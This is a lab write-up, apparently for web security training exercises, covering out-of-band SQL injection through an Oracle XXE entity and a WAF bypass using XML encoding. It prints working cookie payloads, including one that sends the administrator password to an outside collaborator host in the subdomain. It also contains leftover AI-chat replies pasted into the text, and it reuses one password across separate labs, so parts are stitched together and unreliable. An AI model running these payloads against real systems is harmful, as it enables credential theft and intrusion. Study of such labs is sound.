Cookie: TrackingId=FFyToxqSs49lpxuC'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://rfawfotutbq6iasl1guon5zd84ev2uqj.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;

````


**Description**: This payload uses **EXTRACTVALUE** with an XXE entity to make an HTTP request to a collaborator server **(rfawfotutbq6iasl1guon5zd84ev2uqj.oastify.com)**. If the server receives a request, the application is vulnerable.

**Result**: Interaction observed on the collaborator server, confirming the vulnerability.


#### Step 2: Enumerate Password Character by Character

**Description**: Tests if the first character of the administrator password is **'a'**. If true, it triggers an HTTP request to the collaborator server. If false, no request is made.

**Test:**
Tested with the first character not equal to 'a' and observed an interaction, confirming the payload works.
Modified to test equality (=) for positive confirmation of characters.

**Payload**

```
SELECT CASE WHEN ((SUBSTR((SELECT password FROM users WHERE username = 'administrator'),1,1))='a') THEN 'a'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual) ELSE NULL END FROM dual
```

**Encoded Payload:**

```
FFyToxqSs49lpxuC'+union+SELECT+CASE+WHEN+((SUBSTR((SELECT+password+FROM+users+WHERE+username+=+'administrator'),1,1))!='a')+THEN+'a'||(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"?><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://BURP-COLLABORATOR/">+%25remote%3b]>'),'/l')+FROM+dual)+ELSE+NULL+END+FROM+dual--;

```

![image](https://github.com/user-attachments/assets/8239c8e0-09d1-4d43-880e-2df162ed44b9)





**Automation:**
Sent to Burp Suite Intruder.
Configured two payload positions:
Character: Test a-z, 0-9 for each position of the password.
Subdomain: Unique collaborator subdomain for each request.


Set attack type to Battering Ram to synchronize payloads.

![image](https://github.com/user-attachments/assets/d2bbc4e9-782c-4f5f-949a-225014eb2c64)


**Result:** Found an interaction for the letter 'e' as the first character.

![image](https://github.com/user-attachments/assets/ac057fae-9005-49dd-b72c-90f5ca2cd9d4)

**Process**: Repeated for each position (1 to 20, based on prior knowledge of password length) to enumerate the password **e6jomps7kptnx04vcvtz**.
Conclusion: The password is e6jomps7kptnx04vcvtz.

#### Step 3: Direct Password Extraction (Alternative)

Description: Concatenates the administrator password into the collaborator URL, causing the server to receive an HTTP request with the password in the subdomain **(e.g., e6jomps7kptnx04vcvtz.0mntiwqdq98x96mi2d97hujkwb22quej.oastify.com).**

Extract the full administrator password in a single query by embedding it in the collaborator URL.

**Payload (Cheat-Sheet)**
```
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual

```

**Encoded Payload:**
```
mnsyvP6Ci68a0edP'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://'||(SELECT+password+FROM+users+where+username='administrator')||'.0mntiwqdq98x96mi2d97hujkwb22quej.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```
**Result:** The collaborator server received a request with the subdomain containing `e6jomps7kptnx04vcvtz`, confirming the password.

![image](https://github.com/user-attachments/assets/a9bfb4a6-3297-48d5-a094-f5984ee99b92)



**Conclusion**: The password e6jomps7kptnx04vcvtz was extracted directly.

Below is a well-formatted Markdown (`.md`) file summarizing the final results of the out-of-band SQL injection testing, as provided in your input. The content is concise, focusing solely on the final results, and is formatted for clarity and readability.


### Final Results

- **Vulnerability**: Confirmed out-of-band SQL injection.
- **Table**: `users` table exists.
- **User**: `administrator` user exists.
- **Password**: `e6jomps7kptnx04vcvtz` (confirmed via both character-by-character enumeration and direct extraction).


Now we can log in as administrator using the passwrod which we got,

### LAB 18 - SQL injection with filter bypass via XML encoding

### Lab Description

![image](https://github.com/user-attachments/assets/f21b6ba5-99cb-4940-bebb-f40257292cd3)

### Solution

I understand you're writing this for GitHub and want to avoid full documentation-style content like a formal `.md` file with extensive sections. Instead, I'll provide a concise Markdown file with just the essential information from the SQL injection lab, focusing on the key steps and payloads without extra documentation fluff. This will be suitable for a GitHub README or similar.


### SQL Injection with Filter Bypass via XML Encoding

This covers exploiting an SQL injection vulnerability in the stock availability check function, bypassing a WAF using XML encoding with the Hackvertor extension.

#### Steps

Let’s start by exploring the query function to check for availability.

![image](https://github.com/user-attachments/assets/afa97618-6227-4e1f-af97-363a3604f337)


1. **Test SQL Injection**  
   Tried standard payload in Burp Repeater:
   ```sql
   1 UNION SELECT NULL --
   ```
![image](https://github.com/user-attachments/assets/5bcf8ecd-9fe8-4c04-9e89-08f670886444)

   Got `403 Attack detected`. WAF is blocking.

1. **Bypass WAF with Hackvertor**  
   Encoded payload using `hex_entities` in Hackvertor:
   ```sql
   1 UNION SELECT NULL --
   ```

![image](https://github.com/user-attachments/assets/c9f4f050-f63c-41a0-81fb-f2eafec1cb84)

   Sent via Repeater, bypassed WAF successfully.

 ![image](https://github.com/user-attachments/assets/a928b6aa-be8e-4773-95cc-6e09ce7f0ac6)

2. **Find Column Count**  
   Used encoded payload:
   ```sql
   1 UNION SELECT NULL --
   ```
![image](https://github.com/user-attachments/assets/f02212f9-5219-451f-b7b1-ed35a43857e1)

   Confirmed table has **1 column**.

2. **Extract Credentials**  
   Used PortSwigger cheat sheet payload:
   ```sql
   1 UNION SELECT username||'~'||password FROM users --
   ```
![image](https://github.com/user-attachments/assets/46bddc12-a45c-4352-bfed-3fcaca7ce5bf)

   Encoded with Hackvertor, got `administrator~e6jomps7kptnx04vcvtz`.

2. **Login**  
   Logged in with:
   - Username: `administrator`
   - Password: `e6jomps7kptnx04vcvtz`  
   Lab solved.
